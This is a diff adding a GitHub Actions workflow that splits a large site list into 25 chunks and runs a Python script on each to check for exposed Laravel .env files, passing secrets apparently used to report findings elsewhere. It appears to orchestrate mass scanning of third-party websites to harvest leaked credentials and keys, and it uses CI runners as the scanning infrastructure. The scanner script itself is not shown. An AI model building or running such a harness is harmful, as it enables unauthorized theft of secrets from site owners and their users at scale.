@@ -1,0 +1,58 @@
+name: Check Laravel .env
+on:
+  push:
+    branches:
+      - master
+  pull_request:
+    branches:
+      - master
+jobs:
+  split-file:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Clone repository
+        uses: actions/checkout@v2
+      - name: Split List
+        run: |
+          mkdir -p list/
+          cd list/
+          split -l 20000 ../list.txt
+          pwd
+          ls -la
+      - name: Store Splited List
+        uses: actions/upload-artifact@v1
+        with:
+          name: splited-list
+          path: ./list
+  cms-check:
+    needs: split-file
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        chklist: [xaa, xab, xac, xad, xae, xaf, xag, xah, xai, xaj, xak, xal, xam, xan, xao, xap, xaq, xar, xas, xat, xau, xav, xaw, xax, xay]
+    steps:
+      - name: Clone repository
+        uses: actions/checkout@v2
+      - name: Get Splited Lists
+        uses: actions/download-artifact@v1
+        with:
+          name: splited-list
+          path: ./list
+      - name: List Files In Current Directory
+        run: |
+          ls -laR .
+      - name: .env checker
+        run: |
+          sitelist=${{ matrix.chklist }}
+          if [ -f "list/${sitelist}" ]; then
+            timeout 30m python3 main.py ${sitelist} ${{ secrets.API }} ${{ secrets.CHNL }}
+          else
+            echo "Skipping......"
+          fi
+        continue-on-error: true
+      - name: Result
+        uses: actions/upload-artifact@v2
+        with:
+          name: results
+          path: ./rzlt
+          if-no-files-found: ignore
